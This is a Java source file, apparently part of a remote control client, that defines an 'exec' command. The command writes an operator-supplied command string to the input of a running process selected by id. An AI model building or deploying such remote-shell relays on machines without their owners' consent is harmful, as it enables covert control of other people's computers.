package br.com.introcdc.connect.client.commands.process;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:37
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ProcessComponents;

public class ClientCommandExec extends ClientCommand {

    public ClientCommandExec() {
        super("exec");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        String[] args = input.split(" ", 2);
        try {
            if (args.length != 2) {
                msg("Digite o id do processo e o comando!");
                return;
            }
            int id = Integer.parseInt(args[0]);
            if (!ProcessComponents.PROCESS_MAP.containsKey(id)) {
                msg("Processo não encontrado!");
                return;
            }
            if (args[1].isEmpty()) {
                msg("Digite um comando para executar no processo!");
                return;
            }
            ProcessComponents.WRITER_MAP.get(id).println(args[1]);
            ProcessComponents.WRITER_MAP.get(id).flush();
        } catch (Exception ignored) {
            msg("Digite um id válido de processo!");
        }
    }

}
